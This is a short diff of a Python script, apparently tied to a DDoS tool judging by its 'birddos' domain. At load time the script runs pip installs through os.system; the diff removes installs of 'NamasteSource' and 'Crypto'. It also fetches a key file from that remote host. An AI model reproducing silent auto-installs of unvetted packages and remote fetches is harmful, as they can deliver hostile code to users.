@@ -1,10 +1,10 @@
 import os
 def clear():
 	os.system("clear")
-os.system("pip install NamasteSource")
-os.system("pip install Crypto")
+
 os.system("pip install requests")
 os.system("pip install colorama")
+clear()
 import requests,time
 from colorama import Fore
 reeee=requests.get("https://birddos.tk/keyim.txt").text
